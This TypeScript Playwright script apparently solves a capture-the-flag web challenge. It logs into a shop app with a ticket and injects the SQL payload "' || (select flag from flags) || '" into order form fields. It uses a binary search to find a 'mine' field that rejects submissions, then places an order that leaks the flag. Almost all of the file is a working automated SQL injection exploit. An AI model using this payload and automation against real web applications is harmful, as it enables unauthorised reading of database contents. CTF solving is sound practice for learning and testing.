import * as process from 'node:process'
import * as playwright from 'playwright'

const browser_name = process.env['BROWSER'] || 'firefox'
const ticket = process.env['TICKET'] || 'ticket{22weatherdeckweatherdeckweatherdeck143032:fvhGh-7jS1MsxxF4YlB74MPdWSKZl0clNAmCKO8HgkcA6jN9}'
const base_url = process.env['BASE_URL'] || 'http://web:4000'

const browser_klass = playwright[browser_name] as playwright.BrowserType

let screenshot_counter = 0

async function screnshos(page : playwright.Page) {
    await page.screenshot({path: `./tmp/${screenshot_counter++}.png`, fullPage: true })
}

async function wait_for_liveview(page : playwright.Page) {
    await page.waitForSelector("body > .phx-connected", {timeout: 5000})
    await screnshos(page)
    
}

async function sleep(ms: number) {
    return new Promise((resolve, _reject) => {
        setTimeout(resolve, ms)
    })
}

function pick_random(list: any[]) {
    const len = list.length
    const e = Math.floor(Math.random() * len)
    console.log(`picked ${e} from ${len}`)
    return list[e]
}

async function see_title(page : playwright.Page) {
    const title = await page.title()
    const url = page.url()
    console.log(`${title} : ${url}`)
}

async function mine_product(page : playwright.Page, 
    minefield_start: number, 
    minefield_end: number) {
    await see_title(page)

    await page.getByText("buy it now").click()
    await wait_for_liveview(page)
    await see_title(page)

    let stay_winning: boolean = true
    let field_index: number = 0

    while (stay_winning) {
        // await page.screenshot({path: `./tmp/${field_index}.png`, fullPage: true })
        const fields = await (page.getByRole('textbox')).all()
        if (fields.length < 1) break

        for (const field of fields) {
            let content = "x"
            if (field_index >= minefield_start && field_index < minefield_end) {
                content = "' || (select flag from flags) || '"
            }
            await field.fill(content)
            field_index += 1
        }

        await page.getByText("Order").click()
        await sleep(500)
        try {
            console.log(page.url())
            await wait_for_liveview(page)
            await see_title(page)
        } catch (ex) {
            console.log(`got exception ${ex} waiting for fields, maybe done?`)
            stay_winning = false
        }
    }

}

async function buy_product(page : playwright.Page, 
    mine: number) {
    await see_title(page)

    await page.getByText("buy it now").click()
    await wait_for_liveview(page)
    await see_title(page)

    let stay_winning: boolean = true
    let field_index: number = 0

    while (stay_winning) {
        const fields = await (page.getByRole('textbox')).all()
        if (fields.length < 1) break

        for (const field of fields) {
            let content = "x"
            if (field_index != mine) {
                content = "' || (select flag from flags) || '"
            }
            await field.fill(content)
            field_index += 1
        }

        await page.getByText("Order").click()
        try {
            await wait_for_liveview(page)
            await see_title(page)
        } catch (ex) {
            console.log(`got exception ${ex} waiting for fields, maybe done?`)
            stay_winning = false
        }
    }

}

async function order_result(page: playwright.Page) {
    // await screnshos(page)
    let url = page.url()

    if (url.match(/orders\/\d+/)) {
        // made an order
        const results = await page.locator('#order_results').all()
        for (const resultlet of results) {
            const txt = await resultlet.textContent()
            if (txt.match(/flag\{/)) {
                console.log(txt)
                process.exit()
            }
        }
        // wasn't the mine i guess
        return false
    }

    if (url.match(/products\/[0-9a-f]+/)) {
        // bounced out
        return true
    }

    throw `couldn't order_result ${url}`
}

(async () => {
    const browser = await browser_klass.launch()
    const context = await browser.newContext({baseURL: base_url})
    const page = await context.newPage()

    await page.goto("/")
    await see_title(page)

    await page.getByLabel("ticket please:").fill(ticket)
    await page.getByText("enter").click()

    // dashboard
    await see_title(page)

    await page.getByText("Show Products").click()
    // product list
    await see_title(page)

    const show_links = await page.getByText("Show").all()
    const show_link = pick_random(show_links)

    await show_link.click()
    
    // some product
    let product_url = page.url()
    console.log(`product url ${product_url}`)

    let moved_up: boolean = false
    let minefield_start: number = 0
    let minefield_end: number = 100

    let mine : undefined | number = undefined

    do {
        await mine_product(page, minefield_start, minefield_end)
        const found_mine = await order_result(page)        

        if (found_mine) {
            console.log(`mine between ${minefield_start} and ${minefield_end}`)
            let minefield_size = minefield_end - minefield_start
            let minefield_diff = Math.ceil(minefield_size / 2)
            if (moved_up) {
                minefield_end -= minefield_diff
            } else {
                minefield_start += minefield_diff
            }
            moved_up = ! moved_up
        } else {
            console.log(`no mine between ${minefield_start} and ${minefield_end}`)
            let minefield_size = minefield_end - minefield_start
            if (moved_up) {
                minefield_start -= minefield_size
                minefield_end -= minefield_size
            } else {
                minefield_start += minefield_size
                minefield_end += minefield_size
            }
        }
        await page.goto(product_url)

        console.log(`mine sweeping between ${minefield_start} and ${minefield_end}`)

        if (minefield_start == minefield_end) {
            console.log(`found the mine at ${minefield_start}`)
            mine = minefield_start
        }
    } while (undefined == mine)

    await buy_product(page, mine)

    await page.close()
    await context.close()
    await browser.close()
})()
